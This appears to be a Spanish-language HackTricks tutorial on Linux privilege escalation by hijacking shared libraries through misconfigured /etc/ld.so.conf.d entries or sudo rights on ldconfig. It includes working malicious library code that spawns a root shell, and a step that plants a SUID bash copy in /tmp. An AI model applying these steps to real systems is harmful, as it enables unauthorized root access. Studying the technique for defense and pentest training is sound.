# ld.so privesc exploit example

{{#include ../../banners/hacktricks-training.md}}

## Preparar el entorno

En la siguiente sección puedes encontrar el código de los archivos que vamos a usar para preparar el entorno

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Crear** esos archivos en tu máquina en la misma carpeta
2. **Compilar** la **librería**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Copiar** `libcustom.so` a `/usr/lib` y refrescar la caché: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
4. **Compilar** el **ejecutable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Verificar el entorno

Comprueba que _libcustom.so_ se esté **cargando** desde _/usr/lib_ y que puedas **ejecutar** el binario.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Comandos útiles de triage

Cuando ataques un objetivo real, verifica el **nombre exacto de la librería** que necesita el binario y qué está **resolviendo actualmente** el loader:
```bash
readelf -d ./sharedvuln | grep NEEDED
ldconfig -p | grep libcustom
/lib64/ld-linux-x86-64.so.2 --list ./sharedvuln 2>/dev/null \
# x86_64; adjust for your arch
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'
```
Un par de detalles útiles:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` por lo general **no funciona** porque
la redirección la realiza tu shell actual. Usa
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` en su lugar.
- Los binarios **SUID/privileged** ignoran `LD_LIBRARY_PATH`/`LD_PRELOAD` en
**secure-execution mode**, pero los directorios que provienen de `/etc/ld.so.conf` siguen
formando parte de la configuración confiable del loader, así que esta mala configuración
todavía puede afectar a programas privilegiados.
- En versiones más nuevas de glibc, el dynamic loader también expone
`--list-diagnostics`, que es útil para depurar la resolución de la cache y la selección
del subdirectorio `glibc-hwcaps` cuando un hijack no se comporta como se esperaba.

## Exploit

En este escenario vamos a suponer que **alguien ha creado una entrada vulnerable** dentro de un archivo en _/etc/ld.so.conf/_:
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
La carpeta vulnerable es _/home/ubuntu/lib_ (donde tenemos acceso de escritura).\
**Descarga y compila** el siguiente código dentro de esa ruta:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setuid(0);
setgid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Si esperas que **root** (u otra cuenta privilegiada) ejecute el binario vulnerable más tarde, normalmente es mejor dejar un **artefacto propiedad de root** en lugar de iniciar una shell interactiva. Por ejemplo:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Entonces, después de que ocurra la ejecución privilegiada, puedes usar `/tmp/rootbash -p`.

Ahora que hemos **creado la biblioteca libcustom maliciosa dentro de la** ruta mal configurada, tenemos que esperar a un **reboot** o a que el usuario root ejecute **`ldconfig`** (_en caso de que puedas ejecutar este binario como **sudo** o tenga el **suid bit** podrás ejecutarlo tú mismo_).

Una vez que esto haya ocurrido, **vuelve a comprobar** desde dónde está cargando el ejecutable `sharedvuln` la biblioteca `libcustom.so`:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Como puedes ver, está **cargándolo desde `/home/ubuntu/lib`** y si cualquier usuario lo ejecuta, se ejecutará una shell:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Ten en cuenta que en este ejemplo no hemos escalado privilegios, pero modificando los comandos ejecutados y **esperando a que root u otro usuario privilegiado ejecute el binario vulnerable** podremos escalar privilegios.

### Otras misconfigurations - Mismo vuln

En el ejemplo anterior fingimos una misconfiguration en la que un administrador **estableció una carpeta sin privilegios dentro de un archivo de configuración dentro de `/etc/ld.so.conf.d/`**.\
Pero hay otras misconfigurations que pueden causar la misma vulnerability; si tienes **permisos de escritura** en algún **archivo de config** dentro de `/etc/ld.so.conf.d`s, en la carpeta `/etc/ld.so.conf.d` o en el archivo `/etc/ld.so.conf`, puedes configurar la misma vulnerability y explotarla.

## Exploit 2

**Supón que tienes privilegios sudo sobre `ldconfig`**.\
Puedes indicarle a `ldconfig` **desde dónde cargar los archivos conf**, así que podemos aprovecharlo para hacer que `ldconfig` cargue directorios arbitrarios.\
Así que vamos a crear los archivos y carpetas necesarios para cargar "/tmp":
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Ahora, como se indica en el **exploit anterior**, **crea la biblioteca maliciosa dentro de `/tmp`**.\
Y finalmente, carguemos la ruta y comprobemos desde dónde está cargando la biblioteca el binario:
```bash
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Como puedes ver, teniendo privilegios sudo sobre `ldconfig` puedes explotar la misma vulnerabilidad.**



## Referencias

- [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [ldconfig(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
{{#include ../../banners/hacktricks-training.md}}
